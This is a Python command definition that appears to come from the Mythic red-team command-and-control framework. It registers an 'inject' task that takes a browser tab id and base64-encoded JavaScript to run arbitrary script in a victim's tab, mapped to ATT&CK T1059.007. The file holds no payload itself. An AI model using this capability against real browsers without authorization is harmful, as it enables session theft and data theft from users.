from mythic_payloadtype_container.MythicCommandBase import *
import json


class InjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(name="tabid", type=ParameterType.Number),
            CommandParameter(
                name="javascript",
                type=ParameterType.String,
                description="Base64 encoded javascript",
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class InjectCommand(CommandBase):
    cmd = "inject"
    needs_admin = False
    help_cmd = 'inject {"tabid":0,"javascript":"base64 encoded javascript"}'
    description = "Inject arbitrary javascript into a browser tab"
    version = 1
    author = "@xorrior"
    argument_class = InjectArguments
    attackmapping = ["T1059.007"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass
